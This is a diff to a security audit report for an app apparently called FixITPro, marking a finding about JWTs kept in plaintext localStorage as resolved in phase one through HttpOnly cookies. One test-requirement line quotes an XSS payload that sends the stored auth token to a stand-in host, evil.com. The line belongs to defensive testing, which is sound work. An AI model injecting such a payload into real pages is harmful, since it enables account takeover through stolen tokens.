@@ -30,7 +30,7 @@ FixITPro is currently suitable for a **single-owner internal deployment**. To be
 
 ---
 
-### CHB-01 · Access tokens stored in plaintext localStorage
+### CHB-01 · Access tokens stored in plaintext localStorage ✅ PHASE 1 COMPLETE (2026-06-02)
 
 **File/Module:** `web-app/src/store/auth.store.ts:56-57`, `web-app/src/lib/api.ts:19`
 
@@ -48,7 +48,9 @@ Account takeover via XSS is the #1 SaaS credential theft vector. One compromised
 
 **Test required:** E2E test: verify `document.cookie` does not contain the JWT; verify XSS payload `fetch('evil.com?t='+localStorage.getItem('fixitpro-auth'))` returns no token.
 
-**Blocks selling:** YES
+**Phase 1 resolution (2026-06-02):** JWT moved to `HttpOnly; SameSite=Lax` cookie (LAN deployment). `accessToken` removed from Zustand and localStorage. Next.js Edge middleware enforces route protection. Bearer fallback active for 30-day APK transition. SUNMI physical device test (Android 7.1.2) pending before PROD deploy. Phase 2 (CSRF double-submit) planned separately.
+
+**Blocks selling:** Phase 1 complete — SUNMI device test and Phase 2 CSRF remain before commercial sign-off
 
 ---
 
